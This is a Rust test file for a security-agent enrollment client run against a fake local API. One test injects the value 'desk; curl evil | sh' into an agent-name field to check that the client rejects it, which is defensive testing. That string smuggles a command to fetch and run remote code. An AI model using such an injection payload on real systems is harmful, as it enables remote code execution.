//! The hosted client against a fake RamWarden API on loopback.

use std::time::Duration;

use axum::Json;
use axum::Router;
use axum::http::{HeaderMap, StatusCode};
use axum::routing::{get, post};
use ramwarden_platform::Secret;
use ramwarden_wazuh::{Cloud, EnrollRequest, Error};
use serde_json::{Value, json};

fn token_of(h: &HeaderMap) -> String {
    h.get("authorization").and_then(|v| v.to_str().ok()).unwrap_or("").to_string()
}

async fn serve(enrollment: Value) -> String {
    let app = Router::new()
        .route(
            "/v1/wardens/threat/enroll",
            post(move |h: HeaderMap, Json(req): Json<Value>| {
                let e = enrollment.clone();
                async move {
                    assert!(req["os"].is_string() && req["hostname"].is_string());
                    match token_of(&h).as_str() {
                        "Bearer paid" => (StatusCode::OK, Json(e)),
                        "Bearer free" => (StatusCode::FORBIDDEN, Json(json!({}))),
                        _ => (StatusCode::UNAUTHORIZED, Json(json!({}))),
                    }
                }
            }),
        )
        .route(
            "/v1/wardens/threat/status",
            get(|h: HeaderMap| async move {
                if token_of(&h) != "Bearer paid" {
                    return (StatusCode::UNAUTHORIZED, Json(json!({})));
                }
                (StatusCode::OK, Json(json!({
                    "agents": [{"name": "acct1a2b-desk", "status": "active", "last_keep_alive": "t"}],
                    "alerts": [{"timestamp": "t", "rule_id": "5712", "level": 10, "description": "sshd: brute force",
                                "explanation": "Someone tried many SSH passwords.", "advice": "Nothing to do.",
                                "verdict": "benign", "confidence": 0.93}],
                    "summary": "Nothing needs you."
                })))
            }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    format!("http://{addr}")
}

fn good() -> Value {
    json!({"manager": "agents.ramwarden.com", "agent_name": "acct1a2b-desk", "group": "acct-1a2b",
           "agent_key": "MDQyIGFjY3QxYTJiLWRlc2sgYW55IDAxMjM0NTY3ODlhYmNkZWYwMTIzNDU2Nzg5YWJjZGVmMDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=",
           "package": {"url": "https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.14.0-1_amd64.deb",
                       "sha256": "a".repeat(64), "kind": "deb"}})
}

fn cloud(base: &str, token: &str) -> Cloud {
    Cloud::new(base, Secret::new(token), Duration::from_secs(5)).unwrap()
}

#[tokio::test]
async fn enrols_a_paid_device_and_reads_triaged_alerts() {
    let base = serve(good()).await;
    let c = cloud(&base, "paid");
    let e = c.enroll(&EnrollRequest::here()).await.unwrap();
    assert_eq!(e.group, "acct-1a2b");
    assert_eq!(e.package.kind, "deb");
    let s = c.status().await.unwrap();
    assert_eq!(s.agents[0].status, "active");
    assert_eq!(s.alerts[0].verdict.as_deref(), Some("benign"));
    assert_eq!(s.alerts[0].confidence, Some(0.93));
    assert_eq!(s.summary.as_deref(), Some("Nothing needs you."));
}

#[tokio::test]
async fn no_pass_and_signed_out_are_told_apart() {
    let base = serve(good()).await;
    assert!(matches!(cloud(&base, "free").enroll(&EnrollRequest::here()).await, Err(Error::NoPass)));
    assert!(matches!(cloud(&base, "stale").enroll(&EnrollRequest::here()).await, Err(Error::SignedOut)));
    assert!(matches!(cloud(&base, "stale").status().await, Err(Error::SignedOut)));
}

#[tokio::test]
async fn an_unsafe_enrollment_from_the_api_is_refused() {
    let mut bad = good();
    bad["agent_name"] = json!("desk; curl evil | sh");
    let base = serve(bad).await;
    assert!(matches!(cloud(&base, "paid").enroll(&EnrollRequest::here()).await, Err(Error::Parse(..))));
}

#[test]
fn the_hosted_api_must_be_https() {
    assert!(Cloud::new("http://api.ramwarden.com", Secret::new("t"), Duration::ZERO).is_err());
    assert!(Cloud::new("https://api.ramwarden.com", Secret::new("t"), Duration::ZERO).is_ok());
}
